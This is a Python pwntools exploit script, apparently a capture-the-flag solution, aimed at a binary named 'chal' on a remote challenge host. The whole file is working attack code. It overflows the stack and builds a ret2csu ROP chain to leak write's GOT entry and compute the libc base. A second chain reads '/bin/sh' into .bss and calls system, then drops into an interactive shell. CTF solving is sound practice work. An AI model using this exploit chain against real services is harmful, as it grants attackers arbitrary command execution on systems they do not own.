#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dubwewsub.joints.id --port 22222 ./chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dubwewsub.joints.id'
port = int(args.PORT or 22222)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x401389
continue

'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

if args.LOCAL:
    libc= exe.libc
else:
    libc =ELF("libc6_2.31-0ubuntu9.1_amd64.so")

pop_csu = 0x4013ea
call_csu = 0x4013d0

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 0, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0):
    p_csu = p64(pop_csu)
    p_csu += p64(0) # rbx
    p_csu += p64(0+1) # rbp
    p_csu += p64(edi) # r12
    p_csu += p64(rsi) # r13
    p_csu += p64(rdx) # r14
    p_csu += p64(call_func)# r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu

leave = 0x401388
bss = exe.bss()+0x100
pop_rdi=0x00000000004013f3

p ='\xff'*47
io.sendlineafter("1: ",p)

leak = exe.got['write']
p ='b'*48
p += p64(0)
p += ret2csu(exe.got['write'],1,leak,8)
p += p64(exe.sym['main'])
io.sendlineafter("2: ",p)
io.recvline()
data= u64(io.recv(8))
libc.address= data - libc.sym['write']
print "write :",hex(data)

p ='\xff'*47
io.sendlineafter("1: ",p)

p ='b'*48
p += p64(0)
p += ret2csu(exe.got['fgets'],bss,18,libc.sym['_IO_2_1_stdin_'])
p += p64(pop_rdi)
p += p64(bss)
p += p64(libc.sym['system'])
io.sendlineafter("2: ",p)

io.sendline("/bin/sh\x00")

io.interactive()
